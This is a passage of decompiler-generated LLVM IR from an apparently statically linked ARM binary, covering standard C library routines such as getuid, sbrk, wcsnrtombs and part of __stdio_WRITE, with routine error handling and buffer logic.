  %v2_14b84 = load i32, i32* @r1, align 4
  %v3_14b84 = inttoptr i32 %v2_14b84 to i8*
  %v4_14b84 = insertvalue [1 x i8*] undef, i8* %v3_14b84, 0
  %v5_14b84 = load i32, i32* @r2, align 4
  %v6_14b84 = inttoptr i32 %v5_14b84 to i8*
  %v7_14b84 = insertvalue [1 x i8*] undef, i8* %v6_14b84, 0
  %v8_14b84 = call i32 @execve(i8* %v1_14b84, [1 x i8*] %v4_14b84, [1 x i8*] %v7_14b84)
  store i32 %v8_14b84, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_14b84, -4095
  br i1 %tmp, label %dec_label_pc_14ba4, label %dec_label_pc_14b94

dec_label_pc_14b94:                               ; preds = %entry
  %v0_14b94 = call i32 @__errno_location()
  %v0_14b98 = load i32, i32* %r4.global-to-local, align 4
  %v1_14b98 = sub i32 0, %v0_14b98
  %v2_14b9c = inttoptr i32 %v0_14b94 to i32*
  store i32 %v1_14b98, i32* %v2_14b9c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14ba4

dec_label_pc_14ba4:                               ; preds = %entry, %dec_label_pc_14b94
  %v0_14ba4 = phi i32 [ %v8_14b84, %entry ], [ -1, %dec_label_pc_14b94 ]
  %v2_14ba8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14ba8, i32* %r4.global-to-local, align 4
  ret i32 %v0_14ba4

; uselistorder directives
  uselistorder i32 %v8_14b84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14ba4, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14bac = load i32, i32* @r4, align 4
  store i32 %v3_14bac, i32* %stack_var_-8, align 4
  %v0_14bb4 = load i32, i32* @r0, align 4
  store i32 %v0_14bb4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14bb4, -4095
  br i1 %tmp, label %dec_label_pc_14bd0, label %dec_label_pc_14bc0

dec_label_pc_14bc0:                               ; preds = %entry
  %v0_14bc0 = call i32 @__errno_location()
  %v0_14bc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_14bc4 = sub i32 0, %v0_14bc4
  %v2_14bc8 = inttoptr i32 %v0_14bc0 to i32*
  store i32 %v1_14bc4, i32* %v2_14bc8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14bd4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14bd0

dec_label_pc_14bd0:                               ; preds = %entry, %dec_label_pc_14bc0
  %v2_14bd4 = phi i32 [ %v3_14bac, %entry ], [ %v2_14bd4.pre, %dec_label_pc_14bc0 ]
  %v0_14bd0 = phi i32 [ %v0_14bb4, %entry ], [ -1, %dec_label_pc_14bc0 ]
  store i32 %v2_14bd4, i32* @r4, align 4
  ret i32 %v0_14bd0

; uselistorder directives
  uselistorder i32 %v0_14bb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bd0, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14bd8 = load i32, i32* @r4, align 4
  store i32 %v3_14bd8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14bfc, label %dec_label_pc_14bec

dec_label_pc_14bec:                               ; preds = %entry
  %v0_14bec = call i32 @__errno_location()
  %v0_14bf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14bf0 = sub i32 0, %v0_14bf0
  %v2_14bf4 = inttoptr i32 %v0_14bec to i32*
  store i32 %v1_14bf0, i32* %v2_14bf4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14c00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14bfc

dec_label_pc_14bfc:                               ; preds = %entry, %dec_label_pc_14bec
  %v2_14c00 = phi i32 [ %v3_14bd8, %entry ], [ %v2_14c00.pre, %dec_label_pc_14bec ]
  %v0_14bfc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14bec ]
  store i32 %v2_14c00, i32* %r4.global-to-local, align 4
  ret i32 %v0_14bfc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bfc, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14c04 = load i32, i32* @r4, align 4
  store i32 %v3_14c04, i32* %stack_var_-8, align 4
  %v0_14c0c = load i32, i32* @r0, align 4
  store i32 %v0_14c0c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14c0c, -4095
  br i1 %tmp, label %dec_label_pc_14c28, label %dec_label_pc_14c18

dec_label_pc_14c18:                               ; preds = %entry
  %v0_14c18 = call i32 @__errno_location()
  %v0_14c1c = load i32, i32* %r4.global-to-local, align 4
  %v1_14c1c = sub i32 0, %v0_14c1c
  %v2_14c20 = inttoptr i32 %v0_14c18 to i32*
  store i32 %v1_14c1c, i32* %v2_14c20, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14c2c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14c28

dec_label_pc_14c28:                               ; preds = %entry, %dec_label_pc_14c18
  %v2_14c2c = phi i32 [ %v3_14c04, %entry ], [ %v2_14c2c.pre, %dec_label_pc_14c18 ]
  %v0_14c28 = phi i32 [ %v0_14c0c, %entry ], [ -1, %dec_label_pc_14c18 ]
  store i32 %v2_14c2c, i32* %r4.global-to-local, align 4
  ret i32 %v0_14c28

; uselistorder directives
  uselistorder i32 %v0_14c0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c28, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14c30 = load i32, i32* @r4, align 4
  store i32 %v3_14c30, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_30204.836 to i32), i32* %r4.global-to-local, align 4
  %v2_14c38 = load i32, i32* @global_var_30204.836, align 4
  %v2_14c3c = icmp eq i32 %v2_14c38, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_14c3c, label %dec_label_pc_14c4c, label %dec_label_pc_14c58

dec_label_pc_14c4c:                               ; preds = %entry
  %v2_14c4c = call i32 @__GI_brk(i32* null)
  %v1_14c50 = icmp slt i32 %v2_14c4c, 0
  br i1 %v1_14c50, label %dec_label_pc_14c78, label %dec_label_pc_14c58thread-pre-split

dec_label_pc_14c58thread-pre-split:               ; preds = %dec_label_pc_14c4c
  %v0_14c5c.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_14c58.pre = load i32, i32* @global_var_30204.836, align 4
  br label %dec_label_pc_14c58

dec_label_pc_14c58:                               ; preds = %dec_label_pc_14c58thread-pre-split, %entry
  %v2_14c58 = phi i32 [ %v2_14c58.pre, %dec_label_pc_14c58thread-pre-split ], [ %v2_14c38, %entry ]
  %v1_14c64 = phi i32 [ %v0_14c5c.pr, %dec_label_pc_14c58thread-pre-split ], [ %arg1, %entry ]
  %v2_14c5c = icmp eq i32 %v1_14c64, 0
  store i32 %v2_14c58, i32* %r4.global-to-local, align 4
  br i1 %v2_14c5c, label %dec_label_pc_14c7c, label %dec_label_pc_14c6c

dec_label_pc_14c6c:                               ; preds = %dec_label_pc_14c58
  %v2_14c64 = add i32 %v1_14c64, %v2_14c58
  %v1_14c6c = inttoptr i32 %v2_14c64 to i32*
  %v2_14c6c = call i32 @__GI_brk(i32* %v1_14c6c)
  %v1_14c70 = icmp slt i32 %v2_14c6c, 0
  br i1 %v1_14c70, label %dec_label_pc_14c78, label %dec_label_pc_14c6c.dec_label_pc_14c7c_crit_edge

dec_label_pc_14c6c.dec_label_pc_14c7c_crit_edge:  ; preds = %dec_label_pc_14c6c
  %v0_14c7c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14c7c

dec_label_pc_14c78:                               ; preds = %dec_label_pc_14c6c, %dec_label_pc_14c4c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14c7c

dec_label_pc_14c7c:                               ; preds = %dec_label_pc_14c6c.dec_label_pc_14c7c_crit_edge, %dec_label_pc_14c58, %dec_label_pc_14c78
  %v0_14c7c = phi i32 [ %v0_14c7c.pre, %dec_label_pc_14c6c.dec_label_pc_14c7c_crit_edge ], [ %v2_14c58, %dec_label_pc_14c58 ], [ -1, %dec_label_pc_14c78 ]
  %v2_14c80 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14c80, i32* @r4, align 4
  ret i32 %v0_14c7c

; uselistorder directives
  uselistorder i32 %v2_14c58, { 1, 0, 2 }
  uselistorder i32* null, { 1, 5, 3, 6, 4, 0, 2, 7, 11, 8, 9, 10, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_14c7c, { 2, 0, 1 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2deac.373 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2deac.373, { 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_14c98 = icmp eq i32 %arg1, 0
  br i1 %v2_14c98, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_14ca0 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_14cc8 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_14cbc = phi i32 [ %arg1, %.thread ], [ %v3_14ca0, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_14cb4 = ptrtoint i32* %stack_var_-16 to i32
  %v2_14cc0 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_14cc0, i32* %stack_var_-16, align 4
  store i32 %v0_14cc8, i32* %stack_var_-12, align 4
  %v5_14cd0 = inttoptr i32 %v0_14cbc to i8*
  %v6_14cd0 = call i32 @__GI_wcsnrtombs(i8* %v5_14cd0, i32 %v2_14cb4, i32 1, i32 16, i32 %arg3)
  %v2_14cd4 = icmp eq i32 %v6_14cd0, 0
  br i1 %v2_14cd4, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_14ce0 = phi i32 [ %v6_14cd0, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_14ce0

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_14cf0 = load i32, i32* @r2, align 4
  store i32 %v0_14cf0, i32* @r3, align 4
  %v0_14cf8 = load i32, i32* @r0, align 4
  %v1_14cf8 = load i32, i32* @r1, align 4
  %v5_14cf8 = inttoptr i32 %v0_14cf8 to i8*
  %v6_14cf8 = call i32 @__GI_wcsnrtombs(i8* %v5_14cf8, i32 %v1_14cf8, i32 -1, i32 %v0_14cf0, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_14cf8
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14d04 = load i32, i32* @r4, align 4
  store i32 %v3_14d04, i32* %stack_var_-8, align 4
  %v10_14d08 = icmp eq i32 %tmp, %arg2
  br i1 %v10_14d08, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_14d101 = load i32, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14d24

bb:                                               ; preds = %entry
  %v4_14d0c = icmp eq i8* %arg1, null
  %v0_14d10 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br i1 %v4_14d0c, label %dec_label_pc_14d24, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d60

dec_label_pc_14d24:                               ; preds = %.thread, %bb
  %v1_14d64.ph = phi i32 [ %v0_14d10, %bb ], [ %v0_14d101, %.thread ]
  %v2_14d143.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_14d24 = icmp eq i8* %arg1, null
  store i32 %v2_14d143.ph, i32* %ip.global-to-local, align 4
  br i1 %v3_14d24, label %.thread4, label %dec_label_pc_14d58

.thread4:                                         ; preds = %dec_label_pc_14d24
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_14d60

dec_label_pc_14d3c:                               ; preds = %dec_label_pc_14d78
  %v0_14d3c = call i32 @__errno_location()
  store i32 %v0_14d3c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14d48 = inttoptr i32 %v0_14d3c to i32*
  store i32 84, i32* %v2_14d48, align 4
  %v0_14db4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14db4

dec_label_pc_14d50:                               ; preds = %dec_label_pc_14d88
  %v3_14d8c = zext i8 %v2_14d8c to i32
  store i32 %v3_14d8c, i32* @lr, align 4
  br label %dec_label_pc_14da8

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14d24
  store i32 %v2_14d143.ph, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d60

dec_label_pc_14d60:                               ; preds = %bb27, %.thread4, %dec_label_pc_14d58
  %v1_14d6420 = phi i32 [ %v0_14d10, %bb27 ], [ %v1_14d64.ph, %.thread4 ], [ %v1_14d64.ph, %dec_label_pc_14d58 ]
  %v2_14d8814 = phi i32 [ %tmp, %bb27 ], [ %v2_14d143.ph, %.thread4 ], [ %v2_14d143.ph, %dec_label_pc_14d58 ]
  %v1_14d60 = load i32, i32* @r3, align 4
  %v3_14d60 = icmp uge i32 %v1_14d6420, %v1_14d60
  %v1_14d60.v1_14d6420 = select i1 %v3_14d60, i32 %v1_14d60, i32 %v1_14d6420
  store i32 %v1_14d60.v1_14d6420, i32* %r4.global-to-local, align 4
  %v1_14d6c = inttoptr i32 %arg2 to i32*
  %v2_14d6c = load i32, i32* %v1_14d6c, align 4
  store i32 %v2_14d6c, i32* @lr, align 4
  store i32 %v1_14d60.v1_14d6420, i32* %r0.global-to-local, align 4
  %v2_14da08 = icmp eq i32 %v1_14d60.v1_14d6420, 0
  br i1 %v2_14da08, label %dec_label_pc_14da8, label %dec_label_pc_14d78

dec_label_pc_14d78:                               ; preds = %dec_label_pc_14d60, %dec_label_pc_14d98.dec_label_pc_14d78_crit_edge
  %v2_14d88 = phi i32 [ %v2_14d98, %dec_label_pc_14d98.dec_label_pc_14d78_crit_edge ], [ %v2_14d8814, %dec_label_pc_14d60 ]
  %v0_14d80 = phi i32 [ %v0_14d78.pre, %dec_label_pc_14d98.dec_label_pc_14d78_crit_edge ], [ %v2_14d6c, %dec_label_pc_14d60 ]
  %v1_14d78 = inttoptr i32 %v0_14d80 to i32*
  %v2_14d78 = load i32, i32* %v1_14d78, align 4
  %v1_14d80 = add i32 %v0_14d80, 4
  store i32 %v1_14d80, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_14d78, 127
  br i1 %tmp36, label %dec_label_pc_14d3c, label %dec_label_pc_14d88

dec_label_pc_14d88:                               ; preds = %dec_label_pc_14d78
  %v1_14d88 = trunc i32 %v2_14d78 to i8
  %v3_14d88 = inttoptr i32 %v2_14d88 to i8*
  store i8 %v1_14d88, i8* %v3_14d88, align 1
  %v0_14d8c = load i32, i32* %ip.global-to-local, align 4
  %v1_14d8c = inttoptr i32 %v0_14d8c to i8*
  %v2_14d8c = load i8, i8* %v1_14d8c, align 1
  %v2_14d90 = icmp eq i8 %v2_14d8c, 0
  br i1 %v2_14d90, label %dec_label_pc_14d50, label %dec_label_pc_14d98

dec_label_pc_14d98:                               ; preds = %dec_label_pc_14d88
  %v1_14d98 = load i32, i32* %r2.global-to-local, align 4
  %v2_14d98 = add i32 %v1_14d98, %v0_14d8c
  store i32 %v2_14d98, i32* %ip.global-to-local, align 4
  %v0_14d9c = load i32, i32* %r0.global-to-local, align 4
  %v1_14d9c = add i32 %v0_14d9c, -1
  store i32 %v1_14d9c, i32* %r0.global-to-local, align 4
  %v2_14da0 = icmp eq i32 %v1_14d9c, 0
  br i1 %v2_14da0, label %dec_label_pc_14da8, label %dec_label_pc_14d98.dec_label_pc_14d78_crit_edge

dec_label_pc_14d98.dec_label_pc_14d78_crit_edge:  ; preds = %dec_label_pc_14d98
  %v0_14d78.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_14d78

dec_label_pc_14da8:                               ; preds = %dec_label_pc_14d98, %dec_label_pc_14d60, %dec_label_pc_14d50
  %v0_14da8 = phi i32 [ %v0_14d8c, %dec_label_pc_14d50 ], [ %v2_14d8814, %dec_label_pc_14d60 ], [ %v2_14d98, %dec_label_pc_14d98 ]
  %v1_14da8 = load i32, i32* @sp, align 4
  %v9_14da8 = icmp eq i32 %v0_14da8, %v1_14da8
  br i1 %v9_14da8, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_14da8
  %v1_14dac = load i32, i32* @lr, align 4
  store i32 %v1_14dac, i32* %v1_14d6c, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_14da8, %bb30
  %v0_14db0 = load i32, i32* %r0.global-to-local, align 4
  %v1_14db0 = load i32, i32* %r4.global-to-local, align 4
  %v2_14db0 = sub i32 %v1_14db0, %v0_14db0
  store i32 %v2_14db0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14db4

dec_label_pc_14db4:                               ; preds = %dec_label_pc_14d3c, %bb31
  %v0_14db4 = phi i32 [ %v0_14db4.pre, %dec_label_pc_14d3c ], [ %v2_14db0, %bb31 ]
  store i32 %v0_14db4, i32* %r0.global-to-local, align 4
  %v2_14dbc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14dbc, i32* %r4.global-to-local, align 4
  ret i32 %v0_14db4

; uselistorder directives
  uselistorder i32 %v0_14db4, { 1, 0 }
  uselistorder i32 %v1_14d9c, { 1, 0 }
  uselistorder i32 %v2_14d98, { 0, 2, 1 }
  uselistorder i32 %v2_14d78, { 1, 0 }
  uselistorder i32 %v2_14d8814, { 1, 0 }
  uselistorder i32 %v1_14d64.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 1, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14db4, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_14d78, { 1, 0 }
  uselistorder label %dec_label_pc_14d60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d24, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v9_14dc0 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %v2_14dd42 = icmp eq i32 %arg3, 0
  store i1 %v2_14dd42, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_14dd42, label %dec_label_pc_14e74, label %dec_label_pc_14de0

dec_label_pc_14dd4thread-pre-split:               ; preds = %bb22
  %v3_14df8 = load i32, i32* %r7.global-to-local, align 4
  %v5_14df8 = add i32 %v3_14df8, %v3_14dec
  store i32 %v5_14df8, i32* %r7.global-to-local, align 4
  %v5_14dfc = sub i32 %v0_14df4, %v3_14dec
  store i32 %v5_14dfc, i32* @r5, align 4
  %v2_14dd4 = icmp eq i32 %v5_14dfc, 0
  store i1 %v2_14dd4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_14dfc, i32* @r2, align 4
  br i1 %v2_14dd4, label %dec_label_pc_14dd4.dec_label_pc_14e74.loopexit_crit_edge, label %dec_label_pc_14de0

dec_label_pc_14de0:                               ; preds = %entry, %dec_label_pc_14dd4thread-pre-split
  %v0_14de4 = phi i32 [ %v5_14df8, %dec_label_pc_14dd4thread-pre-split ], [ %arg2, %entry ]
  %v0_14de0.in = phi i32 [ %v5_14dfc, %dec_label_pc_14dd4thread-pre-split ], [ %arg3, %entry ]
  %v0_14de0 = icmp slt i32 %v0_14de0.in, 0
  br i1 %v0_14de0, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_14de0
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_14de0, %bb
  store i32 %v0_14de4, i32* @r1, align 4
  %v0_14de8 = load i32, i32* @r4, align 4
  %v1_14de8 = add i32 %v0_14de8, 4
  %v2_14de8 = inttoptr i32 %v1_14de8 to i32*
  %v3_14de8 = load i32, i32* %v2_14de8, align 4
  store i32 %v3_14de8, i32* @r0, align 4
  %v3_14dec = call i32 @__libc_write(i32 %v3_14de8, i32 %v0_14de4)
  store i32 %v3_14dec, i32* %r0.global-to-local, align 4
  %v1_14df0 = icmp slt i32 %v3_14dec, 0
  %v2_14df0 = icmp eq i32 %v3_14dec, 0
  store i1 %v2_14df0, i1* %cpsr_z.global-to-local, align 1
  %v0_14df4 = load i32, i32* @r5, align 4
  store i32 %v0_14df4, i32* @r6, align 4
  br i1 %v1_14df0, label %dec_label_pc_14e04, label %dec_label_pc_14dd4thread-pre-split

dec_label_pc_14e04:                               ; preds = %bb22
  %v0_14e04 = load i32, i32* @r4, align 4
  %v1_14e04 = inttoptr i32 %v0_14e04 to i32*
  %v2_14e04 = load i32, i32* %v1_14e04, align 4
  store i32 %v2_14e04, i32* %r3.global-to-local, align 4
  %v1_14e08 = add i32 %v0_14e04, 8
  store i32 %v1_14e08, i32* %r0.global-to-local, align 4
  %v1_14e0c = inttoptr i32 %v1_14e08 to i32*
  %v2_14e0c = load i32, i32* %v1_14e0c, align 4
  store i32 %v2_14e0c, i32* %r0.global-to-local, align 4
  %v3_14e0c = add i32 %v0_14e04, 12
  %v4_14e0c = inttoptr i32 %v3_14e0c to i32*
  %v5_14e0c = load i32, i32* %v4_14e0c, align 4
  %v1_14e10 = or i32 %v2_14e04, 8
  store i32 %v1_14e10, i32* %r3.global-to-local, align 4
  %v3_14e14 = sdiv i32 %v2_14e04, 256
  %v2_14e18 = sub i32 %v5_14e0c, %v2_14e0c
  store i32 %v2_14e18, i32* %r2.global-to-local, align 4
  %v9_14e18 = icmp eq i32 %v5_14e0c, %v2_14e0c
  store i1 %v9_14e18, i1* %cpsr_z.global-to-local, align 1
  %v1_14e1c = trunc i32 %v3_14e14 to i8
  %v3_14e1c = add i32 %v0_14e04, 1
  %v4_14e1c = inttoptr i32 %v3_14e1c to i8*
  store i8 %v1_14e1c, i8* %v4_14e1c, align 1
  %v0_14e20 = load i32, i32* %r3.global-to-local, align 4
  %v1_14e20 = trunc i32 %v0_14e20 to i8
  %v2_14e20 = load i32, i32* @r4, align 4
  %v3_14e20 = inttoptr i32 %v2_14e20 to i8*
  store i8 %v1_14e20, i8* %v3_14e20, align 1
  %v0_14e24 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14e24, label %dec_label_pc_14e04.dec_label_pc_14e70_crit_edge, label %dec_label_pc_14e28

dec_label_pc_14e04.dec_label_pc_14e70_crit_edge:  ; preds = %dec_label_pc_14e04
  %v0_14e70.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14e70

dec_label_pc_14e28:                               ; preds = %dec_label_pc_14e04
  %v0_14e28 = load i32, i32* %r2.global-to-local, align 4
  %v1_14e28 = load i32, i32* @r5, align 4
  %v9_14e28 = icmp eq i32 %v0_14e28, %v1_14e28
  store i1 %v9_14e28, i1* %cpsr_z.global-to-local, align 1
  %tmp28 = icmp ugt i32 %v0_14e28, %v1_14e28
  br i1 %tmp28, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_14e28
  store i32 %v0_14e28, i32* @r6, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_14e28, %bb23
  %v0_14e30.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_14e34.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_14e54
  %v2_14e34 = phi i32 [ %v2_14e34.pre, %.preheader ], [ %v1_14e58, %dec_label_pc_14e54 ]
  %v0_14e30 = phi i32 [ %v0_14e30.pre, %.preheader ], [ %v1_14e40, %dec_label_pc_14e54 ]
  %v1_14e30 = inttoptr i32 %v0_14e30 to i8*
  %v2_14e30 = load i8, i8* %v1_14e30, align 1
  %v3_14e30 = zext i8 %v2_14e30 to i32
  store i32 %v3_14e30, i32* %r3.global-to-local, align 4
  %v3_14e34 = inttoptr i32 %v2_14e34 to i8*
  store i8 %v2_14e30, i8* %v3_14e34, align 1
  %v0_14e38 = load i32, i32* %r0.global-to-local, align 4
  %v1_14e38 = inttoptr i32 %v0_14e38 to i8*
  %v2_14e38 = load i8, i8* %v1_14e38, align 1
  %v3_14e38 = zext i8 %v2_14e38 to i32
  store i32 %v3_14e38, i32* %r3.global-to-local, align 4
  %v7_14e3c = icmp eq i8 %v2_14e38, 10
  store i1 %v7_14e3c, i1* %cpsr_z.global-to-local, align 1
  %v0_14e40 = load i32, i32* %r7.global-to-local, align 4
  %v1_14e40 = add i32 %v0_14e40, 1
  store i32 %v1_14e40, i32* %r7.global-to-local, align 4
  br i1 %v7_14e3c, label %dec_label_pc_14e48, label %dec_label_pc_14e54

dec_label_pc_14e48:                               ; preds = %bb24
  %v0_14e48 = load i32, i32* @r4, align 4
  %v1_14e48 = add i32 %v0_14e48, 1
  %v2_14e48 = inttoptr i32 %v1_14e48 to i8*
  %v3_14e48 = load i8, i8* %v2_14e48, align 1
  %v4_14e48 = zext i8 %v3_14e48 to i32
  store i32 %v4_14e48, i32* %r3.global-to-local, align 4
  %tmp29 = urem i8 %v3_14e48, 2
  %v2_14e4c = icmp eq i8 %tmp29, 0
  store i1 %v2_14e4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e4c, label %dec_label_pc_14e54, label %dec_label_pc_14e60

dec_label_pc_14e54:                               ; preds = %dec_label_pc_14e48, %bb24
  %v0_14e54 = load i32, i32* @r6, align 4
  %v1_14e54 = add i32 %v0_14e54, -1
  store i32 %v1_14e54, i32* @r6, align 4
  %v7_14e54 = icmp eq i32 %v0_14e54, 1
  store i1 %v7_14e54, i1* %cpsr_z.global-to-local, align 1
  %v1_14e58 = add i32 %v0_14e38, 1
  store i32 %v1_14e58, i32* %r0.global-to-local, align 4
  br i1 %v7_14e54, label %dec_label_pc_14e54.dec_label_pc_14e60_crit_edge, label %bb24

dec_label_pc_14e54.dec_label_pc_14e60_crit_edge:  ; preds = %dec_label_pc_14e54
  %v0_14e60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14e60

dec_label_pc_14e60:                               ; preds = %dec_label_pc_14e48, %dec_label_pc_14e54.dec_label_pc_14e60_crit_edge
  %v0_14e64 = phi i32 [ %v1_14e58, %dec_label_pc_14e54.dec_label_pc_14e60_crit_edge ], [ %v0_14e38, %dec_label_pc_14e48 ]
  %v0_14e60 = phi i32 [ %v0_14e60.pre, %dec_label_pc_14e54.dec_label_pc_14e60_crit_edge ], [ %v0_14e48, %dec_label_pc_14e48 ]
  %v1_14e60 = add i32 %v0_14e60, 8
  %v2_14e60 = inttoptr i32 %v1_14e60 to i32*
  %v3_14e60 = load i32, i32* %v2_14e60, align 4
  store i32 %v3_14e60, i32* %r3.global-to-local, align 4
  %v2_14e64 = add i32 %v0_14e60, 16
  %v3_14e64 = inttoptr i32 %v2_14e64 to i32*
  store i32 %v0_14e64, i32* %v3_14e64, align 4
  %v0_14e68 = load i32, i32* %r3.global-to-local, align 4
  %v1_14e68 = load i32, i32* %r0.global-to-local, align 4
  %v2_14e68 = sub i32 %v1_14e68, %v0_14e68
